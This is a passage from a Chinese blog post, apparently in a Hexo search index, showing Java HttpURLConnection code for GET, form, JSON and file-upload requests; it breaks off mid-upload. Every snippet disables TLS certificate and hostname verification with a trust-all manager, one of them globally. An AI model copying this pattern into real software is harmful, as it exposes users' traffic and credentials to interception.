<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA Http</title>
      <link href="/2023/11/05/%E8%AF%AD%E8%A8%80/Java/HTTP/http/"/>
      <url>/2023/11/05/%E8%AF%AD%E8%A8%80/Java/HTTP/http/</url>
      
        <content type="html"><![CDATA[<h1 id="禁用ssl验证"><a href="#禁用ssl验证" class="headerlink" title="禁用ssl验证"></a>禁用ssl验证</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package http;<br><br>import javax.net.ssl.*;<br>import java.security.cert.X509Certificate;<br>import java.security.NoSuchAlgorithmException;<br>import java.security.KeyManagementException;<br><br>// 通过该方法禁用SSL证书验证，用于允许与未验证证书的HTTPS服务器进行通信<br>public class SSlVerification &#123;<br>    // 通过该方法禁用SSL证书验证，用于允许与未验证证书的HTTPS服务器进行通信<br>    public static void disableSslVerification() &#123;<br>        try &#123;<br>            // 创建一个信任管理器，它不验证证书链<br>            TrustManager[] trustAllCerts = new TrustManager[] &#123; new X509TrustManager() &#123;<br>                public X509Certificate[] getAcceptedIssuers() &#123;<br>                    return null;  // 返回null以接受所有发行者的证书<br>                &#125;<br>                public void checkClientTrusted(X509Certificate[] certs, String authType) &#123;<br>                    // 不执行客户端验证<br>                &#125;<br>                public void checkServerTrusted(X509Certificate[] certs, String authType) &#123;<br>                    // 不执行服务器验证<br>                &#125;<br>            &#125;&#125;;<br><br>            // 安装全信任信任管理器<br>            SSLContext sc = SSLContext.getInstance(&quot;SSL&quot;);<br>            sc.init(null, trustAllCerts, new java.security.SecureRandom());<br>            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());<br><br>            // 创建全信任主机名验证器<br>            HostnameVerifier allHostsValid = new HostnameVerifier() &#123;<br>                public boolean verify(String hostname, SSLSession session) &#123;<br>                    return true;  // 接受所有主机名<br>                &#125;<br>            &#125;;<br><br>            // 安装全信任主机名验证器<br>            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);<br>        &#125; catch (NoSuchAlgorithmException | KeyManagementException e) &#123;<br>            e.printStackTrace();  // 打印异常信息<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Get请求"><a href="#Get请求" class="headerlink" title="Get请求"></a>Get请求</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.BufferedReader;<br>import java.io.IOException;<br>import java.io.InputStreamReader;<br>import java.net.HttpURLConnection;<br>import java.net.URL;<br>import java.nio.charset.Charset;<br><br>import javax.net.ssl.SSLContext;<br>import javax.net.ssl.TrustManager;<br>import javax.net.ssl.X509TrustManager;<br>import java.security.cert.X509Certificate;<br><br>public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 指定 URL<br>            String url = &quot;https://www.baidu.com&quot;;<br><br>            // 创建 URL 对象<br>            URL baiduURL = new URL(url);<br><br>            // 创建信任所有证书的 TrustManager<br>            TrustManager[] trustAllCertificates = new TrustManager[] &#123;<br>                new X509TrustManager() &#123;<br>                    public X509Certificate[] getAcceptedIssuers() &#123;<br>                        return null;<br>                    &#125;<br>                    public void checkClientTrusted(X509Certificate[] certs, String authType) &#123;<br>                    &#125;<br>                    public void checkServerTrusted(X509Certificate[] certs, String authType) &#123;<br>                    &#125;<br>                &#125;<br>            &#125;;<br><br>            // 创建 SSLContext<br>            SSLContext sslContext = SSLContext.getInstance(&quot;TLS&quot;);<br>            sslContext.init(null, trustAllCertificates, new java.security.SecureRandom());<br><br>            // 打开连接<br>            HttpURLConnection connection = (HttpURLConnection) baiduURL.openConnection();<br><br>            if (connection instanceof javax.net.ssl.HttpsURLConnection) &#123;<br>                // 如果是 HTTPS 连接，设置 SSLContext<br>                ((javax.net.ssl.HttpsURLConnection) connection).setSSLSocketFactory(sslContext.getSocketFactory());<br>                ((javax.net.ssl.HttpsURLConnection) connection).setHostnameVerifier((hostname, session) -&gt; true);<br>            &#125;<br><br>            // 设置请求方法<br>            connection.setRequestMethod(&quot;GET&quot;);<br><br>            // 不跟随 302 跳转<br>            connection.setInstanceFollowRedirects(false);<br><br>            // 设置超时时间为 3 秒<br>            connection.setConnectTimeout(3000);<br><br>            // 设置代理地址为 http://127.0.0.1:8080<br>            System.setProperty(&quot;http.proxyHost&quot;, &quot;127.0.0.1&quot;);<br>            System.setProperty(&quot;http.proxyPort&quot;, &quot;8080&quot;); <br>            // 设置代理地址为 https://127.0.0.1:8080<br>            System.setProperty(&quot;https.proxyHost&quot;, &quot;127.0.0.1&quot;);<br>            System.setProperty(&quot;https.proxyPort&quot;, &quot;8080&quot;);<br><br>            // 设置 User-Agent 为谷歌浏览器<br>            connection.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;);<br><br>            // 获取响应代码<br>            int responseCode = connection.getResponseCode();<br><br>            if (responseCode == 200) &#123;<br>                // 获取响应头中的编码信息<br>                String contentType = connection.getHeaderField(&quot;Content-Type&quot;);<br>                Charset charset = Charset.defaultCharset();<br><br>                if (contentType != null) &#123;<br>                    String[] values = contentType.split(&quot;;&quot;);<br>                    for (String value : values) &#123;<br>                        value = value.trim();<br>                        if (value.toLowerCase().startsWith(&quot;charset=&quot;)) &#123;<br>                            String charsetValue = value.substring(&quot;charset=&quot;.length());<br>                            charset = Charset.forName(charsetValue);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                // 读取响应<br>                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), charset));<br>                String line;<br>                StringBuilder response = new StringBuilder();<br><br>                while ((line = reader.readLine()) != null) &#123;<br>                    response.append(line);<br>                &#125;<br><br>                // 输出响应<br>                System.out.println(&quot;Response from https://www.baidu.com:&quot;);<br>                System.out.println(response.toString());<br><br>                // 关闭连接<br>                connection.disconnect();<br>            &#125; else &#123;<br>                System.out.println(&quot;Failed to connect. Response code: &quot; + responseCode);<br>            &#125;<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h1><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.*;<br>import java.net.*;<br>import java.nio.charset.Charset;<br>import javax.net.ssl.*;<br>import java.security.cert.X509Certificate;<br>import java.nio.charset.StandardCharsets;<br><br>public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 指定 URL<br>            String url = &quot;https://httpbin.org/post&quot;;  // 修改为 https://httpbin.org/post<br><br>            // 创建 URL 对象<br>            URL targetURL = new URL(url);<br><br>            // 创建信任所有证书的 TrustManager<br>            TrustManager[] trustAllCertificates = new TrustManager[] &#123;<br>                    new X509TrustManager() &#123;<br>                        public X509Certificate[] getAcceptedIssuers() &#123;<br>                            return null;<br>                        &#125;<br>                        public void checkClientTrusted(X509Certificate[] certs, String authType) &#123;<br>                        &#125;<br>                        public void checkServerTrusted(X509Certificate[] certs, String authType) &#123;<br>                        &#125;<br>                    &#125;<br>            &#125;;<br><br>            // 创建 SSLContext<br>            SSLContext sslContext = SSLContext.getInstance(&quot;TLS&quot;);<br>            sslContext.init(null, trustAllCertificates, new java.security.SecureRandom());<br><br>            // 打开连接<br>            HttpURLConnection connection = (HttpURLConnection) targetURL.openConnection();<br><br>            if (connection instanceof HttpsURLConnection) &#123;<br>                // 如果是 HTTPS 连接，设置 SSLContext<br>                ((HttpsURLConnection) connection).setSSLSocketFactory(sslContext.getSocketFactory());<br>                ((HttpsURLConnection) connection).setHostnameVerifier((hostname, session) -&gt; true);<br>            &#125;<br><br>            // 设置请求方法为 POST<br>            connection.setRequestMethod(&quot;POST&quot;);<br><br>            // 不跟随 302 跳转<br>            connection.setInstanceFollowRedirects(false);<br><br>            // 设置超时时间为 3 秒<br>            connection.setConnectTimeout(3000);<br><br>            // 设置代理地址为 http://127.0.0.1:8080<br>            System.setProperty(&quot;http.proxyHost&quot;, &quot;127.0.0.1&quot;);<br>            System.setProperty(&quot;http.proxyPort&quot;, &quot;8080&quot;);<br>            // 设置代理地址为 https://127.0.0.1:8080<br>            System.setProperty(&quot;https.proxyHost&quot;, &quot;127.0.0.1&quot;);<br>            System.setProperty(&quot;https.proxyPort&quot;, &quot;8080&quot;);<br><br>            // 设置 User-Agent 为谷歌浏览器<br>            connection.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;);<br><br>            // 启用输入流<br>            connection.setDoOutput(true);<br><br>            // 创建表单数据<br>            String formData = &quot;param1=value1&amp;param2=value2&quot;;  // 根据实际情况替换为表单数据<br><br>            // 将表单数据写入连接<br>            try (OutputStream os = connection.getOutputStream()) &#123;<br>                byte[] input = formData.getBytes(StandardCharsets.UTF_8);<br>                os.write(input, 0, input.length);<br>            &#125;<br><br>            // 获取响应代码<br>            int responseCode = connection.getResponseCode();<br><br>            if (responseCode == 200) &#123;<br>                // 获取响应头中的编码信息<br>                String contentType = connection.getHeaderField(&quot;Content-Type&quot;);<br>                Charset charset = Charset.defaultCharset();<br><br>                if (contentType != null) &#123;<br>                    String[] values = contentType.split(&quot;;&quot;);<br>                    for (String value : values) &#123;<br>                        value = value.trim();<br>                        if (value.toLowerCase().startsWith(&quot;charset=&quot;)) &#123;<br>                            String charsetValue = value.substring(&quot;charset=&quot;.length());<br>                            charset = Charset.forName(charsetValue);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                // 读取响应<br>                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), charset))) &#123;<br>                    String line;<br>                    StringBuilder response = new StringBuilder();<br><br>                    while ((line = reader.readLine()) != null) &#123;<br>                        response.append(line);<br>                    &#125;<br><br>                    // 输出响应<br>                    System.out.println(&quot;Response from &quot; + url + &quot;:&quot;);<br>                    System.out.println(response.toString());<br>                &#125;<br><br>                // 关闭连接<br>                connection.disconnect();<br>            &#125; else &#123;<br>                System.out.println(&quot;连接失败。响应代码：&quot; + responseCode);<br>            &#125;<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.*;<br>import java.net.*;<br>import java.nio.charset.Charset;<br>import javax.net.ssl.*;<br>import java.security.cert.X509Certificate;<br>import java.util.zip.GZIPInputStream;<br><br>public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 指定 URL<br>            String url = &quot;https://httpbin.org/post&quot;;  // 修改为实际的目标 URL<br><br>            // 创建信任所有证书的 TrustManager<br>            TrustManager[] trustAllCertificates = new TrustManager[] &#123;<br>                    new X509TrustManager() &#123;<br>                        public X509Certificate[] getAcceptedIssuers() &#123;<br>                            return null;<br>                        &#125;<br>                        public void checkClientTrusted(X509Certificate[] certs, String authType) &#123;<br>                        &#125;<br>                        public void checkServerTrusted(X509Certificate[] certs, String authType) &#123;<br>                        &#125;<br>                    &#125;<br>            &#125;;<br><br>            // 创建 SSLContext<br>            SSLContext sslContext = SSLContext.getInstance(&quot;TLS&quot;);<br>            sslContext.init(null, trustAllCertificates, new java.security.SecureRandom());<br><br>            // 创建 URL 对象<br>            URL targetURL = new URL(url);<br><br>            // 打开连接<br>            HttpURLConnection connection = (HttpURLConnection) targetURL.openConnection();<br><br>            if (connection instanceof HttpsURLConnection) &#123;<br>                // 如果是 HTTPS 连接，设置 SSLContext<br>                ((HttpsURLConnection) connection).setSSLSocketFactory(sslContext.getSocketFactory());<br>                ((HttpsURLConnection) connection).setHostnameVerifier((hostname, session) -&gt; true);<br>            &#125;<br><br>            // 设置请求方法为 POST<br>            connection.setRequestMethod(&quot;POST&quot;);<br><br>            // 不跟随 302 跳转<br>            connection.setInstanceFollowRedirects(false);<br><br>            // 设置超时时间为 3 秒<br>            connection.setConnectTimeout(3000);<br><br>            // 设置代理地址为 http://127.0.0.1:8080 和 https://127.0.0.1:8080<br>            System.setProperty(&quot;http.proxyHost&quot;, &quot;127.0.0.1&quot;);<br>            System.setProperty(&quot;http.proxyPort&quot;, &quot;8080&quot;);<br>            System.setProperty(&quot;https.proxyHost&quot;, &quot;127.0.0.1&quot;);<br>            System.setProperty(&quot;https.proxyPort&quot;, &quot;8080&quot;);<br><br>            // 设置 User-Agent 为谷歌浏览器 UA<br>            connection.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;);<br><br>            // 启用输入流和输出流<br>            connection.setDoOutput(true);<br>            connection.setDoInput(true);<br><br>            // 设置 Content-Type 为 JSON<br>            connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json&quot;);<br><br>            // 创建 JSON 数据<br>            String jsonData = &quot;&#123;\&quot;key\&quot;: \&quot;value\&quot;&#125;&quot;;  // 根据实际情况替换为您要发送的 JSON 数据<br><br>            // 将 JSON 数据写入连接<br>            try (OutputStream os = connection.getOutputStream(); OutputStreamWriter osw = new OutputStreamWriter(os, &quot;UTF-8&quot;)) &#123;<br>                osw.write(jsonData);<br>                osw.flush();<br>            &#125;<br><br>            // 获取响应代码<br>            int responseCode = connection.getResponseCode();<br><br>            if (responseCode == 200) &#123;<br>                // 获取响应头中的编码信息<br>                String contentType = connection.getHeaderField(&quot;Content-Type&quot;);<br>                Charset charset = Charset.defaultCharset();<br><br>                if (contentType != null) &#123;<br>                    String[] values = contentType.split(&quot;;&quot;);<br>                    for (String value : values) &#123;<br>                        value = value.trim();<br>                        if (value.toLowerCase().startsWith(&quot;charset=&quot;)) &#123;<br>                            String charsetValue = value.substring(&quot;charset=&quot;.length());<br>                            charset = Charset.forName(charsetValue);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                // 读取响应<br>                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), charset))) &#123;<br>                    String line;<br>                    StringBuilder response = new StringBuilder();<br><br>                    while ((line = reader.readLine()) != null) &#123;<br>                        response.append(line);<br>                    &#125;<br><br>                    // 输出响应<br>                    System.out.println(&quot;Response from &quot; + url + &quot;:&quot;);<br>                    System.out.println(response.toString());<br>                &#125;<br><br>                // 关闭连接<br>                connection.disconnect();<br>            &#125; else &#123;<br>                System.out.println(&quot;连接失败。响应代码：&quot; + responseCode);<br>            &#125;<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.*;<br>import java.net.*;<br>import java.nio.charset.Charset;<br>import javax.net.ssl.*;<br>import java.security.cert.X509Certificate;<br><br>public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 指定 URL<br>            String url = &quot;https://httpbin.org/post&quot;;  // 修改为实际的目标 URL<br><br>            // 创建信任所有证书的 TrustManager<br>            TrustManager[] trustAllCertificates = new TrustManager[] &#123;<br>                    new X509TrustManager() &#123;<br>                        public X509Certificate[] getAcceptedIssuers() &#123;<br>                            return null;<br>                        &#125;<br>                        public void checkClientTrusted(X509Certificate[] certs, String authType) &#123;<br>                        &#125;<br>                        public void checkServerTrusted(X509Certificate[] certs, String authType) &#123;<br>                        &#125;<br>                    &#125;<br>            &#125;;<br><br>            // 创建 SSLContext<br>            SSLContext sslContext = SSLContext.getInstance(&quot;TLS&quot;);<br>            sslContext.init(null, trustAllCertificates, new java.security.SecureRandom());<br><br>            // 创建 URL 对象<br>            URL targetURL = new URL(url);<br><br>            // 打开连接<br>            HttpURLConnection connection = (HttpURLConnection) targetURL.openConnection();<br><br>            if (connection instanceof HttpsURLConnection) &#123;<br>                // 如果是 HTTPS 连接，设置 SSLContext<br>                ((HttpsURLConnection) connection).setSSLSocketFactory(sslContext.getSocketFactory());<br>                ((HttpsURLConnection) connection).setHostnameVerifier((hostname, session) -&gt; true);<br>            &#125;<br><br>            // 设置请求方法为 POST<br>            connection.setRequestMethod(&quot;POST&quot;);<br><br>            // 不跟随 302 跳转<br>            connection.setInstanceFollowRedirects(false);<br><br>            // 设置超时时间为 3 秒<br>            connection.setConnectTimeout(3000);<br><br>            // 设置代理地址为 http://127.0.0.1:8080 和 https://127.0.0.1:8080<br>            System.setProperty(&quot;http.proxyHost&quot;, &quot;127.0.0.1&quot;);<br>            System.setProperty(&quot;http.proxyPort&quot;, &quot;8080&quot;);<br>            System.setProperty(&quot;https.proxyHost&quot;, &quot;127.0.0.1&quot;);<br>            System.setProperty(&quot;https.proxyPort&quot;, &quot;8080&quot;);<br><br>            // 设置 User-Agent 为谷歌浏览器 UA<br>            connection.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;);<br><br>            // 启用输入流和输出流<br>            connection.setDoOutput(true);<br>            connection.setDoInput(true);<br><br>            // 设置 Content-Type 为 multipart/form-data<br>            String boundary = &quot;----&quot; + Long.toHexString(System.currentTimeMillis());<br>            connection.setRequestProperty(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=&quot; + boundary);<br>            try (OutputStream os = connection.getOutputStream();<br>                 PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, &quot;UTF-8&quot;), true)) &#123;<br>                // 添加文件参数<br>                File file = new File(&quot;F:\\test\\JAVA\\test\\httptest\\demo\\src\\1.txt&quot;); // 替换为实际文件路径<br>                String fileName = file.getName();<br>                writer.append(&quot;--&quot; + boundary).append(&quot;\r\n&quot;);<br>                